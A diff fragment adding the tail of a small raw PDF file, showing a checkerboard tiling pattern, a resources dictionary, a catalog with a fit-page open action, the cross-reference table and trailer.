+/Length 58
+/TilingType 1
+/BBox[0 0 16 16]
+/YStep 16
+/PaintType 1
+/Resources<<
+>>
+/XStep 16
+>>
+stream
+0.65 g
+0 0 16 16 re f
+0.15 g
+0 0 8 8 re f
+8 8 8 8 re f
+endstream
+endobj
+4 0 obj
+<<
+/Pattern<<
+  /P1 7 0 R
+  /P2 8 0 R
+>>
+/Font<<
+  /F1 5 0 R
+>>
+>>
+endobj
+1 0 obj
+<<
+/Pages 2 0 R
+/Type/Catalog
+/OpenAction[3 0 R /Fit]
+>>
+endobj
+
+xref
+0 11
+0000000000 65535 f
+0000002260 00000 n
+0000000522 00000 n
+0000000973 00000 n
+0000002178 00000 n
+0000000266 00000 n
+0000000794 00000 n
+0000001953 00000 n
+0000000015 00000 n
+0000000577 00000 n
+0000001085 00000 n
+trailer
+<<
+/ID[(FIWED) (FIWED)]
+/Root 1 0 R
+/Size 11
+>>
+startxref
+2333
+%%EOF
